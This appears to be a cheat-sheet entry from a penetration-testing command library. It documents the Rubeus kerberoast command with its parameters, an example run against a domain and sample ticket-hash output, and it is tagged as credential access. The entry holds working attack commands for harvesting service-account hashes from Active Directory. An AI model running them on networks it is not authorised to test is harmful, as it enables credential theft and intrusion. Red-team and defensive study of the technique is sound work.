---
type: command
executor: powershell
data: >-
  Rubeus.exe kerberoast [/spn:\"$_SPN\"] [/user:$_USER] [/domain:$_DOMAIN]
  [/dc:$_DOMAIN_CONTROLLER] [/ou:\"$_OU\"]
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - kerberoasting
  - credential-access
verified: true
validated: true
---

# rubeus-kerberoast

## Command

```powershell
Rubeus.exe kerberoast [/spn:"$_SPN"] [/user:$_USER] [/domain:$_DOMAIN] [/dc:$_DOMAIN_CONTROLLER] [/ou:"$_OU"]
```

## Description

Requests TGS tickets for roasting service account hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [/spn:$_SPN] | Specific SPN to target | No |
| [/user:$_USER] | User to impersonate | No |
| [/domain:$_DOMAIN] | Target domain | No |
| [/dc:$_DOMAIN_CONTROLLER] | DC IP/FQDN | No |
| [/ou:$_OU] | OU filter | No |

## Examples

### Basic Usage

```powershell
Rubeus.exe kerberoast /domain:example.com
```

## Expected Output

Hashes: "$krb5tgs$23$*svcacct$EXAMPLE$HTTP/dc*...".

## Related

- [[tools/Rubeus]]
